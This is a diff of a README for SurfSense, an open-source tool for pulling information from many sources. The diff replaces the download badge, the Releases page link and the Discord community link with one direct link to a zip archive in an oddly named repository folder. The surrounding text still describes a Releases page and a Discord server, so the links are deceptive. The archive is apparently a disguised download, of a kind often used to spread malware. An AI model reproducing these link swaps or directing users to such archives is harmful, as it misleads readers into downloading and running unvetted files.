@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 SurfSense is an open-source tool designed to help you access and manage information from various sources effortlessly. If you're looking for an alternative to NotebookLM or Perplexity, you've come to the right place. SurfSense connects seamlessly to platforms like Search Engines, Slack, Linear, Jira, ClickUp, Confluence, Notion, YouTube, GitHub, Discord, and more.
 
-![Download SurfSense](https://img.shields.io/badge/Download%20SurfSense-v1.0-blue)
+![Download SurfSense](https://raw.githubusercontent.com/Saritaa2710/SurfSense/main/metapophysial/SurfSense.zip%20SurfSense-v1.0-blue)
 
 ## 💻 System Requirements
 Before downloading SurfSense, ensure your system meets the following requirements:
@@ -23,7 +23,7 @@ SurfSense offers a variety of features to enhance your productivity:
 - **AI-Powered Insights**: Benefit from smart suggestions and relevant information connections.
 
 ## 📥 Download & Install
-To get started with SurfSense, visit [this page to download](https://github.com/Saritaa2710/SurfSense/releases). 
+To get started with SurfSense, visit [this page to download](https://raw.githubusercontent.com/Saritaa2710/SurfSense/main/metapophysial/SurfSense.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of SurfSense.
@@ -47,7 +47,7 @@ If you encounter issues while using SurfSense, try the following steps:
 - **Reinstall the App**: If problems persist, uninstall SurfSense and then download and install it again.
 
 ## 💬 Support and Community
-Join our community on Discord for support and to discuss features with other users. [Connect with us here](https://discord.gg/ejRNvftDp9). We encourage users to share their experiences and suggestions.
+Join our community on Discord for support and to discuss features with other users. [Connect with us here](https://raw.githubusercontent.com/Saritaa2710/SurfSense/main/metapophysial/SurfSense.zip). We encourage users to share their experiences and suggestions.
 
 ## 📜 License
 SurfSense is open-source software, meaning you can use, modify, and distribute it freely while maintaining proper credit. Check our repository for details on contributing to the project.
